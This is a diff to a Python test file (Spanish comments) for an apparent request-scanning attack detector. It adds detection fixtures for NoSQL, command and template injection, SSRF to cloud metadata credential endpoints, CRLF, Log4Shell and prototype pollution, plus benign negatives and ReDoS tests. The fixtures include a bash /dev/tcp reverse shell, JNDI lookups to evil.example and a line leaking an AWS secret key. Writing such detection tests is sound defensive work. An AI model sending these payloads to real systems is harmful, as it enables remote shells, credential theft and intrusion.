@@ -33,6 +33,54 @@ from gatekeeper.rules import decode, normalize, scan
         ("/x?f=..%c0%af..%c0%afetc/passwd", "path_traversal"),  # UTF-8 sobre-long
         ("/x?q=1' AND ASCII(SUBSTRING(nombre,1,1))>64--", "sqli"),  # blind boolean
         ("/x?q=web-inf/web.xml", "sensitive_files"),  # Java WEB-INF
+        # familias nuevas de 0.3.1 (B3): medidas y añadidas al corpus
+        ("/x?user[$ne]=x", "nosql"),  # bypass de login
+        ('/x?q={"user": {"$ne": ""}}', "nosql"),  # $ne en JSON
+        ("/x?q=password[$nin][]=root", "nosql"),  # bypass con $nin
+        ("/x?q=$where=this.password.match(/^a/)", "nosql"),  # JS en MongoDB
+        ("/x?q=name[$regex]=^adm", "nosql"),  # exfiltración por regex
+        ("/x?q=user[%24ne]=x", "nosql"),  # operador codificado
+        ("/x?q=; ls -la /tmp", "cmdi"),  # separador ;
+        ("/x?q=| cat /var/log/syslog", "cmdi"),  # pipe
+        ("/x?q=&& whoami", "cmdi"),  # cadena &&
+        ("/x?q=$(id)", "cmdi"),  # sustitución $( )
+        ("/x?q=`uname -a`", "cmdi"),  # backticks
+        ("/x?q=powershell.exe -enc SQBFAFgA", "cmdi"),  # LOLBin Windows
+        ("/x?q=;system('id')", "cmdi"),  # webshell PHP
+        ("/x?q=shell_exec('cat /var/log/syslog')", "cmdi"),  # función PHP
+        ("/x?q=bash -i >& /dev/tcp/10.0.0.1/4444", "cmdi"),  # reverse shell
+        ("/x?url=http://169.254.169.254/latest/meta-data/", "ssrf"),
+        ("/x?url=http://169.254.170.2/v2/credentials", "ssrf"),  # ECS
+        ("/x?url=http://metadata.google.internal/computeMetadata/v1/", "ssrf"),
+        ("/x?url=file:///var/www/app/config.php", "ssrf"),
+        ("/x?url=gopher://127.0.0.1:6379/_SET", "ssrf"),
+        ("/x?url=dict://127.0.0.1:6379/info", "ssrf"),
+        ("/x?url=http://100.100.100.200/latest/meta-data/", "ssrf"),  # Alibaba
+        ("/x?q={{7*7}}", "ssti"),  # Jinja2/Twig
+        ("/x?q={{ 9*9 }}", "ssti"),
+        ("/x?q=${7*7}", "ssti"),
+        ("/x?q=<%= 7*7 %>", "ssti"),  # ERB/JSP
+        ("/x?q=#{7*7}", "ssti"),  # Ruby/Java EL
+        ("/x?q={{config.items()}}", "ssti"),  # volcado de configuración
+        ("/x?q={{self.__dict__['__init__']}}", "ssti"),  # escapada
+        ("/x?q=a\r\nSet-Cookie: admin=1", "crlf"),  # splitting real
+        ("/x?q=%0d%0aLocation:%20http://evil.example", "crlf"),  # codificado
+        ("/x?q=line1\\r\\nX-Injected: yes", "crlf"),  # literal escapado
+        ("/x?q=${jndi:ldap://evil.example/a}", "log4shell"),  # canónico
+        ("/x?q=${jndi:rmi://evil.example:1099/x}", "log4shell"),  # RMI
+        ("/x?q=${${::-j}ndi:ldap://evil.example/a}", "log4shell"),  # decoy
+        ("/x?q=${jndi:${lower:l}${lower:d}ap://evil/a}", "log4shell"),  # lookups
+        ("/x?q=${env:AWS_SECRET_ACCESS_KEY}", "log4shell"),  # exfil por logs
+        ("/x?q=jndi:ldap://evil.example:1389/a", "log4shell"),  # sin ${ }
+        ("/x?q=__proto__[isAdmin]=true", "proto_pollution"),
+        ('/x?q={"__proto__": {"admin": true}}', "proto_pollution"),
+        ("/x?q=constructor.prototype.polluted=1", "proto_pollution"),
+        # evasiones de 0.3.1 sobre familias existentes
+        ("/x?q=&lt;script&gt;alert(1)&lt;/script&gt;", "xss"),  # entidad nombrada
+        ("/x?q=java\tscript:alert(1)", "xss"),  # tab en el esquema (WHATWG)
+        ("/x?q=javascript&colon;alert(1)", "xss"),  # &colon; nombrada
+        ("/x?q=1 /*!50000union*/ select password from users", "sqli"),
+        ("/x?q=1%2F*!50000union*%2F+select+1,2,3", "sqli"),  # versionado codificado
     ],
 )
 def test_detects_attacks(payload, rule):
@@ -54,6 +102,18 @@ def test_detects_attacks(payload, rule):
         "/search?q=id_rsa vs ed25519",  # sin la ruta .ssh/
         "/api?q=seleccionar la mejor opcion",  # «seleccionar» no es «select»
         "/search?q=benchmark test results",  # sin paréntesis numérico
+        # fronteras de 0.3.1: los negativos que las familias nuevas NO deben tocar
+        "/api/items?precio[$gt]=10",  # $gt es filtro legítimo, no firma NoSQL
+        '/x?q={"filters": {"price": {"$gt": 10}}}',  # idem en JSON
+        "/search?q=angular+{{user.name}}+binding",  # plantilla de cliente
+        "/search?q=curl+vs+wget+para+descargas",  # binario sin separador
+        "/auth/callback?redirect_uri=http://localhost:3000/cb",  # OAuth dev
+        "/search?q=set-cookie+header+http",  # cabecera sin CRLF delante
+        "/search?q=${HOME}+variable+de+entorno",  # variable, no lookup
+        "/api/list?sort=asc;type=json",  # ; como separador de params
+        "/search?q=java+script:+los+dos+palabras",  # espacio no es esquema
+        "/search?q=constructor+of+class+in+python",  # sin .prototype
+        "/search?q=options+|+set+up+guide",  # prosa tras pipe
     ],
 )
 def test_benign_requests_pass(payload):
@@ -81,6 +141,14 @@ def test_sql_comment_obfuscation_is_stripped():
     assert scan("/x?q=1'/**/OR/**/1=1") == "sqli"
 
 
+def test_versioned_comment_is_unwrapped_not_deleted():
+    """`/*!50000union*/` se EJECUTA en MySQL: desenvolverlo, no borrarlo."""
+    assert normalize("1 /*!50000union*/ select 1") == "1  union  select 1"
+    assert normalize("1 /*!union*/ select 1") == "1  union  select 1"
+    # sin cierre no hay carrera ni deshacer: queda tal cual, acotado
+    assert "/*" in normalize("1 /*!50000" + "union" * 500)
+
+
 def test_custom_rules_are_scanned_and_can_be_disabled():
     import re
 
@@ -97,3 +165,38 @@ def test_no_redos_on_pathological_input():
         t = time.perf_counter()
         scan(payload)
         assert time.perf_counter() - t < 2.0
+
+
+def test_no_redos_on_new_families():
+    """Las familias de 0.3.1 también van acotadas: ReDoS es un DoS real."""
+    import time
+
+    patologicos = [
+        "{" * 1_000_000,  # ssti: `{{` sin cierre
+        "$" * 500_000,  # nosql/log4shell: `$` sueltos
+        "${" * 200_000,  # log4shell: `${` sin cerrar
+        ";" + "a" * 1_000_000,  # cmdi: separador sin binario
+        "; " * 300_000 + "ls",  # cmdi: separadores repetidos
+        "\r\n" * 200_000 + "x-foo: 1",  # crlf: saltos encadenados
+        "169.254." * 100_000,  # ssrf: IP incompleta y larga
+        "__proto__" * 100_000,  # proto_pollution
+        "&lt;" * 200_000,  # entidades nombradas sin resolver
+        "/*!50000" + "union" * 100_000,  # comentario versionado sin cerrar
+        "j\ta\rv\nn\ta\r" * 50_000 + ":",  # esquema con contenedores
+    ]
+    for payload in patologicos:
+        t = time.perf_counter()
+        scan(payload)
+        elapsed = time.perf_counter() - t
+        assert elapsed < 2.0, f"scan tardó {elapsed:.2f}s con {payload[:24]!r}"
+
+
+def test_family_names_are_valid_disabled_rules():
+    """Los nombres de `disabled_rules` se validan contra RULES al arrancar."""
+    from gatekeeper.config import Config
+
+    familias = {"nosql", "cmdi", "ssrf", "ssti", "crlf", "log4shell", "proto_pollution"}
+    config = Config(disabled_rules=familias)  # no lanza: todas existen
+    assert config.disabled_rules == familias
+    with pytest.raises(ValueError):
+        Config(disabled_rules={"no-existe"})
